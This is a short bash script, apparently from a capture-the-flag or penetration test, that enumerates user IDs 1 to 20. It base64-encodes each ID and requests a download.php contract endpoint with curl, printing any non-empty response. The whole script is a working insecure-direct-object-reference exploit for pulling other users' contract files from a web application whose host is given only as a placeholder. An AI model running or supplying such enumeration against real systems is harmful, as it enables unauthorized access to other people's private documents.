#!/bin/bash
url="http://ip/download.php?contract="
for i in {1..20}; do
    # Reproduce the exact encoding: uid -> base64
    encodedid=$(echo -n $i | base64 -w 0)
    
    echo "Testing user $i (contract=$encodedid)..."
    
    # Make request and capture response
    response=$(curl -s "${url}${encodedid}")
    
    # Check for meaningful content
    if [[ ${#response} -gt 10 ]]; then
        echo "Found content for user $i:"
        echo "$response"
    else
        echo "Empty or minimal response"
    fi
done
